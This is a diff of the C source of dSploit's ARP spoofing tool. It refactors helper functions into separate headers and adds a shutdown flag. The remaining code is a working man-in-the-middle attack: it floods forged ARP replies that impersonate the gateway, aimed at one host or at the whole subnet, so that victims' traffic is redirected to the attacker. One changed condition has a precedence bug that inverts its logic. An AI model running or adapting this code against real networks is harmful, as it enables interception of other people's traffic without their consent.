@@ -16,219 +16,30 @@
  * You should have received a copy of the GNU General Public License
  * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
  */
-#include "config.h"
-
-#include <sys/types.h>
 #include <sys/param.h>
-#include <netinet/in.h>
-
-#include <stdio.h>
 #include <string.h>
 #include <signal.h>
-#include <err.h>
-#include <libnet.h>
-#include <pcap.h>
-
-#include <netinet/if_ether.h>
-
-#include <droid.h>
-
-#include "hashmap.h"
-
-#define BROADCAST_MAC_ADDR "\xff\xff\xff\xff\xff\xff"
-#define VOID_MAC_ADDR			 "\x00\x00\x00\x00\x00\x00"
+#include "arp.h"
+#include "net.h"
 
 static libnet_t *lnet;
-static struct ether_addr spoof_mac, target_mac;
+static struct ether_addr *our_mac, target_mac;
 static in_addr_t gateway_ip, target_ip;
 static char *iface;
 static Hashmap *netmap = NULL;
-
-typedef struct {
-	int address;
-	unsigned char mac[6];
-}
-network_entry_t;
-
-static inline int xdigit (char c) {
-	unsigned d;
-	d = (unsigned)(c-'0');
-	if (d < 10) return (int)d;
-	d = (unsigned)(c-'a');
-	if (d < 6) return (int)(10+d);
-	d = (unsigned)(c-'A');
-	if (d < 6) return (int)(10+d);
-	return -1;
-}
-
-/*
- * Convert Ethernet address in the standard hex-digits-and-colons to binary
- * representation.
- * Re-entrant version (GNU extensions)
- */
-struct ether_addr *ether_aton_r (const char *asc, struct ether_addr * addr)
-{
-	int i, val0, val1;
-	for (i = 0; i < ETHER_ADDR_LEN; ++i) {
-		val0 = xdigit(*asc);
-		asc++;
-		if (val0 < 0)
-			return NULL;
-
-		val1 = xdigit(*asc);
-		asc++;
-		if (val1 < 0)
-			return NULL;
-
-		addr->ether_addr_octet[i] = (unsigned char)((val0 << 4) + val1);
-
-		if (i < ETHER_ADDR_LEN - 1) {
-			if (*asc != ':')
-				return NULL;
-			asc++;
-		}
-	}
-	if (*asc != '\0')
-		return NULL;
-	return addr;
-}
-
-/*
- * Convert Ethernet address in the standard hex-digits-and-colons to binary
- * representation.
- */
-struct ether_addr *ether_aton (const char *asc)
-{
-	static struct ether_addr addr;
-	return ether_aton_r(asc, &addr);
-}
-
-static int arp_cache_lookup( in_addr_t address, struct ether_addr *ether, const char* ifname )
-{
-	int num, type, flags;
-	FILE *fp 			 = fopen( "/proc/net/arp", "r" );
-	char ip[128]   = { 0x00 },
-			 hwa[128]  = { 0x00 },
-			 mask[128] = { 0x00 },
-			 line[128] = { 0x00 },
-			 dev[128]  = { 0x00 },
-			*ipaddress = inet_ntoa( *( struct in_addr *)&address );
-
-	if( !fp ) return -1;
-
-	/*
-	 * Bypass header, read one line.
-	 */
-	fgets( line, sizeof(line), fp );
-
-	while( fgets( line, sizeof(line), fp ) )
-	{
-		/*
-		 * All these strings can't overflow because fgets above reads limited amount of data
-		 */
-		num = sscanf( line, "%s 0x%x 0x%x %s %s %s\n", ip, &type, &flags, hwa, mask, dev );
-		if( num < 4 )
-			continue;
-
-		/*
-		 * Not on the same interface, skip.
-		 */
-		if( strcmp( dev, ifname ) != 0 )
-			continue;
-
-		/*
-		 * Unknown or broadcast address, skip.
-		 */
-		if( strcmp( hwa, "00:00:00:00:00:00" ) == 0 || strcmp( hwa, "FF:FF:FF:FF:FF:FF" ) == 0 || strcmp( hwa, "ff:ff:ff:ff:ff:ff" ) == 0 )
-			continue;
-
-		/*
-		 * found!
-		 */
-		if( strcmp( ip, ipaddress ) == 0 )
-		{
-			memcpy( ether, (void const *)ether_aton( hwa ), sizeof( struct ether_addr ) );
-
-			printf( "%s -> %s\n", ip, hwa );
-
-			fclose( fp );
-
-			return 0;
-		}
-	}
-
-	fclose( fp );
-
-	return -1;
-}
-
-static int arp_send( libnet_t *pnet, int op, unsigned char *sha, in_addr_t spa, unsigned char *tha, in_addr_t tpa )
-{
-	int retval;
-
-	if( sha == NULL && ( sha = (unsigned char *)libnet_get_hwaddr( pnet ) ) == NULL )
-	{
-		printf( "libnet_get_hwaddr failed : %s\n", libnet_geterror( pnet ) );
-		return -1;
-	}
-
-	if( spa == 0 && ( spa = libnet_get_ipaddr4( pnet ) ) == -1 )
-	{
-		printf( "libnet_get_ipaddr4 failed : %s\n", libnet_geterror( pnet ) );
-		return -1;
-	}
-
-	if( tha == NULL )
-		tha = BROADCAST_MAC_ADDR;
-
-	if( libnet_autobuild_arp( op, sha, (unsigned char *)&spa, tha, (unsigned char *)&tpa, pnet ) == -1 )
-	{
-		printf( "libnet_autobuild_arp failed : %s\n", libnet_geterror( pnet ) );
-		return -1;
-	}
-
-	if( libnet_build_ethernet( tha, sha, ETHERTYPE_ARP, NULL, 0, pnet, 0 ) == -1 )
-	{
-		printf( "libnet_autobuild_arp failed : %s\n", libnet_geterror( pnet ) );
-		return -1;
-	}
-
-	retval = libnet_write( pnet );
-	if( retval == -1 )
-		printf( "libnet_write failed : %s\n", libnet_geterror( pnet ) );
-
-	else
-		printf
-		(
-				"sent spoof from %s [ %x:%x:%x:%x:%x:%x ] to %s [ %x:%x:%x:%x:%x:%x ]\n",
-				inet_ntoa( *(struct in_addr *)&spa ),
-				sha[0], sha[1], sha[2], sha[3], sha[4], sha[5],
-				inet_ntoa( *(struct in_addr *)&tpa ),
-				tha[0], tha[1], tha[2], tha[3], tha[4], tha[5]
-		);
-
-	libnet_clear_packet( pnet );
-
-	return retval;
-}
-
-static int arp_find(in_addr_t ip, struct ether_addr *mac)
-{
-	if( arp_cache_lookup( ip, mac, iface ) == 0 )
-		return (1);
-
-	return (0);
-}
+static int killed = 0;
 
 static void cleanup(int sig)
 {
+	killed = 1;
+
 	printf( "Restoring arp table ...\n" );
 	int i, j;
 	struct ether_addr gateway_mac;
 
 	if( netmap == NULL )
 	{
-		if( arp_find( gateway_ip, &gateway_mac) )
+		if( arp_lookup( gateway_ip, &gateway_mac, iface ) == 0 )
 		{
 			for( i = 0; i < 3; i++ )
 			{
@@ -240,7 +51,7 @@ static void cleanup(int sig)
 	}
 	else
 	{
-		if( arp_find( gateway_ip, &gateway_mac ) )
+		if( arp_lookup( gateway_ip, &gateway_mac, iface ) == 0 )
 		{
 			for( i = 0; i < 3; i++ )
 			{
@@ -266,14 +77,6 @@ static void cleanup(int sig)
 	}
 
 	exit(0);
-}
-
-int address_hash( void* key ) {
-	return (int)key;
-}
-
-bool address_hash_equals(void* keyA, void* keyB) {
-	return address_hash( keyA ) == address_hash( keyB );
 }
 
 int main(int argc, char *argv[])
@@ -323,7 +126,7 @@ int main(int argc, char *argv[])
 		exit(1);
 	}
 
-	if (target_ip != 0 && !arp_find(target_ip, &target_mac)) {
+	if (target_ip != 0 && !arp_lookup(target_ip, &target_mac, iface ) == 0 ) {
 		printf( "couldn't arp for host %s\n", libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
 		exit(1);
 	}
@@ -332,14 +135,22 @@ int main(int argc, char *argv[])
 	signal( SIGINT, cleanup );
 	signal( SIGTERM, cleanup );
 
-	// single ip spoofing
-	if( target_ip != 0 )
+	our_mac = ( struct ether_addr * )libnet_get_hwaddr( lnet );
+	if( our_mac == NULL )
+	{
+		printf( "libnet_get_hwaddr failed : %s\n", libnet_geterror( lnet ) );
+		exit( 1 );
+	}
+
+	// if the target is the gateway itself, we switch to subnet mode,
+	// otherwise if the target was set, we are in single ip spoofing mode.
+	if( target_ip != 0 && target_ip != gateway_ip )
 	{
 		printf( "Single target mode.\n" );
 
-		for (;;)
+		while( killed == 0 )
 		{
-			arp_send( lnet, ARPOP_REPLY, NULL, gateway_ip, (unsigned char *)&target_mac, target_ip );
+			arp_send( lnet, ARPOP_REPLY, (unsigned char *)our_mac, gateway_ip, (unsigned char *)&target_mac, target_ip );
 			sleep(1);
 		}
 	}
@@ -351,77 +162,30 @@ int main(int argc, char *argv[])
 		int netmask = 0,
 				ifaddr  = 0,
 				nhosts  = 0,
-				i;
-		pcap_if_t *ifaces = NULL,
-				*pcap_iface;
-		pcap_addr_t *pcap_address;
+				i				= 0;
+
 		network_entry_t *entry;
 
-		if( pcap_findalldevs( &ifaces, pcap_ebuf ) != 0 )
-		{
-			printf( "%s\n", pcap_ebuf);
-			exit(1);
-		}
-
-		for( pcap_iface = ifaces; pcap_iface != NULL && netmask == 0; pcap_iface = pcap_iface->next )
-		{
-			if( strcmp( pcap_iface->name, iface ) == 0 )
-			{
-				for( pcap_address = pcap_iface->addresses; pcap_address != NULL; pcap_address = pcap_address->next )
-				{
-					if( pcap_address->addr->sa_family == AF_INET )
-					{
-						ifaddr  = *( unsigned int *)&((struct sockaddr_in*)pcap_address->addr)->sin_addr;
-						netmask = *( unsigned int *)&((struct sockaddr_in*)pcap_address->netmask)->sin_addr;
-
-						break;
-					}
-				}
-			}
-		}
-
-		if( netmask == 0 || ifaddr == 0 )
+		if( net_get_details( iface, &netmask, &ifaddr, &nhosts ) != 0 )
 			exit( 1 );
-
-		nhosts = ntohl(~netmask);
 
 		printf( "netmask = %s\n", inet_ntoa( *( struct in_addr *)&netmask ) );
 		printf( "ifaddr  = %s\n", inet_ntoa( *( struct in_addr *)&ifaddr ) );
 		printf( "gateway = %s\n", inet_ntoa( *( struct in_addr *)&gateway_ip ) );
 		printf( "hosts   = %d\n", nhosts );
 
-		netmap = hashmapCreate( nhosts, address_hash, address_hash_equals );
+		netmap = net_get_mapping( iface, nhosts, ifaddr, netmask, gateway_ip );
 
-		// precompute addresses
-		for( i = 1; i <= nhosts; i++ )
+		while( killed == 0 )
 		{
-			target_ip = ( ifaddr & netmask ) | htonl(i);
-
-			if( target_ip != ifaddr && target_ip != gateway_ip )
-			{
-				// skip endpoints unknown to arp and broadcasting address
-				if( arp_find( target_ip, &target_mac ) )
-				{
-					entry = ( network_entry_t * )malloc( sizeof( network_entry_t ) );
-
-					entry->address = target_ip;
-					memcpy( &entry->mac, &target_mac, sizeof( BROADCAST_MAC_ADDR ) );
-
-					hashmapPut( netmap, ( void *)target_ip, entry );
-				}
-			}
-		}
-
-		for(;;)
-		{
-			for( i = 1; i <= nhosts; i++ )
+			for( i = 1; i <= nhosts && killed == 0; i++ )
 			{
 				target_ip = ( ifaddr & netmask ) | htonl(i);
 
 				entry = hashmapGet( netmap, (void *)target_ip );
-				if( entry )
+				if( entry && killed == 0 )
 				{
-					arp_send( lnet, ARPOP_REPLY, NULL, gateway_ip, (unsigned char *)&entry->mac, target_ip );
+					arp_send( lnet, ARPOP_REPLY, (unsigned char *)our_mac, gateway_ip, (unsigned char *)&entry->mac, target_ip );
 				}
 			}
 
